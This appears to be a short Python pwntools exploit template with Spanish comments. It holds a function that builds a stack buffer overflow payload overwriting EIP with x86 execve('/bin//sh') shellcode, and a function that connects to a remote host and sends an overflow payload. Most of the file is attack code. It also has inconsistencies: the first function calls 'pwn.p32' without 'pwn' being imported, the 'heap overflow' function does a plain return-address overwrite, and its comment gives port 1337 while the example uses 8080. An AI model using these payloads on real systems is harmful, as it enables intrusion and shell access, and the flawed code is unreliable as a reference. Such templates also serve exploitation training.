from pwn import *

'''
Función que creas la variable "padding" y la llena
con 32 caracteres "A" para rellenar el buffer 
hasta alcanzar la dirección de retorno. Luego 
sobrescribimos la dirección de retorno con la 
dirección de nuestro shellcode, utilizando la 
función pwn.p32 para convertir la dirección a un 
valor de 4 bytes. Después, combinamos las 
variables "padding", "eip" y "shellcode" en un 
solo payload y lo retornamos.
'''

def create_buffer_overflow_payload(eip, shellcode):
    padding = b"A" * 32

    eip = pwn.p32(eip)

    payload = padding + eip + shellcode

    return payload

''' Ejemplo de uso:
Creamos el shellcode en lenguaje ensamblador y 
luego llamamos a la función 
"create_buffer_overflow_payload" para crear el 
payload de buffer overflow. Finalmente, 
imprimimos el payload en formato hexadecimal 
para verificar que todo está correcto.

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = create_buffer_overflow_payload(0x12345678, shellcode)
print(payload.hex())
'''

#######################################

'''
la función exploit() se conecta a un servidor 
remoto en el puerto 1337 y construye un 
payload malicioso para enviar al programa 
vulnerable. El payload consiste en 32 bytes de 
caracteres 'A' seguidos de la dirección de 
memoria 0xdeadbeef codificada en formato little-
endian utilizando la función p32()
'''

def create_heap_overflow_payload(ip_remota, puerto):
    r = remote(ip_remota, puerto)
    payload = b'A' * 32 + p32(0xdeadbeef)
    r.sendline(payload)
    response = r.recvline().decode()
    print(response)

'''
Ejemplo de uso:

create_heap_overflow_payload('192.168.1.100', 8080)
'''